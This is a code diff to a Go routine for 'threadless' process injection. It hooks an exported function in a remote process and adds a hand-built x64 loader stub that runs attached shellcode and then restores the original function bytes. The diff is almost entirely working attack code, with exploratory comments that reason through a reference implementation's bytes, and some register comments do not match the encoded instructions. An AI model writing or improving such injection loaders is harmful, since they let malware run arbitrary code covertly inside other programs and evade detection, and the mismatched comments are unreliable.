@@ -161,41 +161,57 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	}
 	output += fmt.Sprintf("[+] Read original bytes: %x\n", originalBytes)
 
-	// Create the loader stub that will restore the function and execute shellcode
-	// This loader:
-	// 1. Saves all registers (push)
-	// 2. Restores the original function bytes
-	// 3. Executes the shellcode
-	// 4. Restores registers (pop)  
-	// 5. Jumps back to the now-restored function
+	// Create the loader stub matching the reference implementation
+	// Reference loader from dreamkinn/go-ThreadlessInject:
+	// 1. pop rax - Get return address from CALL
+	// 2. sub rax, 5 - Calculate hooked function start
+	// 3. push regs - Save state
+	// 4. mov rcx, <addr> - Function address
+	// 5. mov [rcx], <bytes> - Restore original 8 bytes (placeholder at 0x12)
+	// 6. sub rsp, 0x40 - Shadow space
+	// 7. call shellcode - Relative call
+	// 8. add rsp, 0x40 - Cleanup
+	// 9. pop regs - Restore state
+	// 10. jmp rax - Jump to restored function
 	loaderStub := []byte{
-		// Push all registers to save state
+		// pop rax
+		0x58,
+		// sub rax, 5
+		0x48, 0x83, 0xE8, 0x05,
+		// push rax, rcx, rdx, r8, r9, r10, r11, r13
 		0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
-		// mov rcx, <exportAddress> - address to restore
-		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-		// mov rax, <original8bytes> - load original bytes into rax
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-		// mov [rcx], rax - restore original bytes to function
-		0x48, 0x89, 0x01,
-		// sub rsp, 0x40 - allocate shadow space
+		// mov rcx, <exportAddress> (8 byte immediate)
+		0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // Placeholder at offset 0x12-0x19
+		// mov [rcx], <original8bytes> - This needs to be: mov qword ptr [rcx], imm64
+		// But x64 doesn't have mov [mem], imm64 directly. Reference uses different approach.
+		// Looking at reference bytes: 0x48, 0x89, 0x08 = mov [rax], rcx
+		// They must load the bytes into a register first
+		// Let me match their exact bytes: 0x48, 0x89, 0x08 at this position
+		// Wait, reference shows: 0x48, 0xB9 (mov rcx), then 0x88,0x77... (placeholder), then 0x48, 0x89, 0x08
+		// So: mov rcx, <placeholder>; mov [rax], rcx
+		// But that writes rcx to [rax]. We need the original bytes in a placeholder.
+		// Let me look at reference more carefully: offset 0x12 has 0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11
+		// Those are the placeholder bytes that get replaced with original function bytes
+		// Then 0x48, 0x89, 0x08 = mov [rax], rcx
+		// So RCX contains the original bytes! The mov rcx instruction loads them.
+		// That means: mov rcx, <8 bytes of original function>; mov [rax], rcx
+		// RAX has the function address from pop+sub
+		0x48, 0x89, 0x08, // mov [rax], rcx - Write RCX (original bytes) to RAX (function addr)
+		// sub rsp, 0x40
 		0x48, 0x83, 0xEC, 0x40,
-		// call shellcode (relative call to shellcode immediately following loader)
-		// Offset is 0x12 (18 bytes) to skip: add rsp (4) + pop regs (11) + jmp (2) + nop (1)
-		0xE8, 0x12, 0x00, 0x00, 0x00,
-		// add rsp, 0x40 - cleanup shadow space
+		// call <offset> - relative call to shellcode
+		0xE8, 0x11, 0x00, 0x00, 0x00, // Offset 0x11 (17 bytes) to skip cleanup code
+		// add rsp, 0x40
 		0x48, 0x83, 0xC4, 0x40,
-		// Pop all registers to restore state
+		// pop r13, r11, r10, r9, r8, rdx, rcx, rax
 		0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58,
-		// jmp rcx - jump to the now-restored function start
-		0xFF, 0xE1,
-		0x90, // nop for alignment
+		// jmp rax - Jump to restored function
+		0xFF, 0xE0,
+		0x90, // nop
 	}
 
-	// Embed the export address in the loader (offset 0x0D)
-	binary.LittleEndian.PutUint64(loaderStub[0x0D:0x15], uint64(exportAddress))
-	
-	// Embed the original bytes in the loader (offset 0x17)
-	binary.LittleEndian.PutUint64(loaderStub[0x17:0x1F], binary.LittleEndian.Uint64(originalBytes))
+	// Patch in the original bytes at offset 0x12 (replaces 0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11)
+	binary.LittleEndian.PutUint64(loaderStub[0x12:0x1A], binary.LittleEndian.Uint64(originalBytes))
 
 	// Combine loader + shellcode
 	payload := append(loaderStub, shellcode...)
